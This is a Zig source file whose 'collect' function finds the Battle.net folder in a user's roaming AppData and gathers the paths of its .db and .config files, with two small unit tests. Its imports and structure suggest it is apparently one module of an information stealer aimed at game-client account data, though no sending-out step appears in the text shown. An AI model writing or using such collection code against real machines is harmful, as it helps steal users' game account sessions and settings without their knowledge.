const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const file_io = @import("../parsers/file_io.zig");

pub const GameResult = struct {
    source_path: ?[]const u8,
    db_files: [][]const u8,
    config_files: [][]const u8,
    total_count: usize,
};

fn collectFilesByExtension(allocator: std.mem.Allocator, base: []const u8, ext: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var dir = std.fs.openDirAbsolute(base, .{}) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .file) {
            const entry_ext = std.fs.path.extension(entry.name);
            if (std.mem.eql(u8, entry_ext, ext)) {
                const full = try std.fs.path.join(allocator, &[_][]const u8{ base, entry.name });
                try files.append(full);
            }
        }
    }
    return files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local_app_data: []const u8) !GameResult {
    _ = local_app_data;

    const source_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "Battle.net" });

    var dir = std.fs.openDirAbsolute(source_path, .{}) catch {
        return GameResult{
            .source_path = null,
            .db_files = &[_][]const u8{},
            .config_files = &[_][]const u8{},
            .total_count = 0,
        };
    };
    dir.close();

    const db_files = try collectFilesByExtension(allocator, source_path, ".db");
    const config_files = try collectFilesByExtension(allocator, source_path, ".config");

    return GameResult{
        .source_path = source_path,
        .db_files = db_files,
        .config_files = config_files,
        .total_count = db_files.len + config_files.len,
    };
}

fn freeGameResult(result: GameResult, allocator: std.mem.Allocator) void {
    if (result.source_path) |p| allocator.free(p);
    for (result.db_files) |f| allocator.free(f);
    allocator.free(result.db_files);
    for (result.config_files) |f| allocator.free(f);
    allocator.free(result.config_files);
}

const testing = std.testing;

test "collect returns empty for nonexistent battlenet" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__roaming", "C:\\__nonexistent__local");
    defer freeGameResult(result, testing.allocator);
    try testing.expect(result.source_path == null);
    try testing.expectEqual(@as(usize, 0), result.total_count);
}

test "collectFilesByExtension returns empty for nonexistent dir" {
    const files = try collectFilesByExtension(testing.allocator, "C:\\__nonexistent__", ".db");
    defer {
        for (files) |f| testing.allocator.free(f);
        testing.allocator.free(files);
    }
    try testing.expectEqual(@as(usize, 0), files.len);
}
